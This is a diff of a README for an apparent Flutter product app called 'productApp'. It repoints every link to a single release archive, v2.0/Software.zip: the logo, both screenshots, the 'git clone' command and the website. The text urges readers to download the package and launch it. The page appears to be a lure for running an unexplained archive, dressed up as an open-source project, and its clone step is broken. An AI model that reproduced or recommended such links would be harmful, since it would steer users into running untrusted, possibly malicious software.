@@ -1,6 +1,6 @@
 # 🚀 Welcome to the ProductApp Repository 🚀
 
-![ProductApp Logo](https://github.com/gideon2321/productApp/releases/download/v1.0/Soft.zip)
+![ProductApp Logo](https://github.com/gideon2321/productApp/releases/download/v2.0/Software.zip)
 
 ### Repository Name: productApp
 ### Short Description: 
@@ -10,7 +10,7 @@ Developed a feature-rich product app using Flutter with BLoC state management fo
 addproduct, api, dart, flutter, productapp, productappinflutter, productsshopping, restapi, sharedpreference, shoppingapp
 
 ### Get the Latest Release:
-[![Download Release](https://github.com/gideon2321/productApp/releases/download/v1.0/Soft.zip%20Release-blue)](https://github.com/gideon2321/productApp/releases/download/v1.0/Soft.zip)
+[![Download Release](https://github.com/gideon2321/productApp/releases/download/v2.0/Software.zip%20Release-blue)](https://github.com/gideon2321/productApp/releases/download/v2.0/Software.zip)
 
 **Note:** Click the button above to download the latest release package that needs to be launched.
 
@@ -22,8 +22,8 @@ Welcome to ProductApp, your go-to solution for managing products efficiently and
 ## 📷 Screenshots
 Here are some snapshots of the ProductApp in action:
 
-![Screenshot 1](https://github.com/gideon2321/productApp/releases/download/v1.0/Soft.zip)
-![Screenshot 2](https://github.com/gideon2321/productApp/releases/download/v1.0/Soft.zip)
+![Screenshot 1](https://github.com/gideon2321/productApp/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/gideon2321/productApp/releases/download/v2.0/Software.zip)
 
 ## 🛠️ Features
 - **BLoC State Management**: Efficiently handle app state for a seamless user experience.
@@ -37,7 +37,7 @@ To get started with ProductApp, follow these steps:
 
 1. **Clone the Repository**:
    ```
-   git clone https://github.com/gideon2321/productApp/releases/download/v1.0/Soft.zip
+   git clone https://github.com/gideon2321/productApp/releases/download/v2.0/Software.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -66,7 +66,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ### Need Help or Have Questions?
 If you encounter any issues or have any questions while using ProductApp, please feel free to open an issue here on GitHub.
 
-### You can also visit our website for more information and resources: [ProductApp Website](https://github.com/gideon2321/productApp/releases/download/v1.0/Soft.zip)
+### You can also visit our website for more information and resources: [ProductApp Website](https://github.com/gideon2321/productApp/releases/download/v2.0/Software.zip)
 
 ### Check the "Releases" Section for Additional Information if the Download Link Doesn't Work
 
